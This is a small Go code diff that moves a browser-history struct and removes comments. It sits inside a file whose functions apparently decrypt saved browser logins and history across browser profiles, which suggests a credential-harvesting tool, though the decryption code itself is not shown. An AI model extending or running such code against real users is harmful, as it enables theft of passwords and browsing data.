@@ -7,6 +7,12 @@ import (
 	"os"
 )
 
+type History struct {
+	URL           string `json:"url"`
+	Title         string `json:"title"`
+	LastVisitTime string `json:"last_visit_time"`
+}
+
 type Login struct {
 	OriginURL string `json:"origin_url"`
 	Username  string `json:"username"`
@@ -221,14 +227,7 @@ func DecryptLoginData(profiles []string, localState string) []Login {
 
 	return loginDataArray
 }
-// History represents browser history information.
-type History struct {
-	URL           string `json:"url"`
-	Title         string `json:"title"`
-	LastVisitTime string `json:"last_visit_time"`
-}
 
-// DecryptHistoryData retrieves browser history data.
 func DecryptHistoryData(profiles []string) []History {
 	var historyArray []History
 
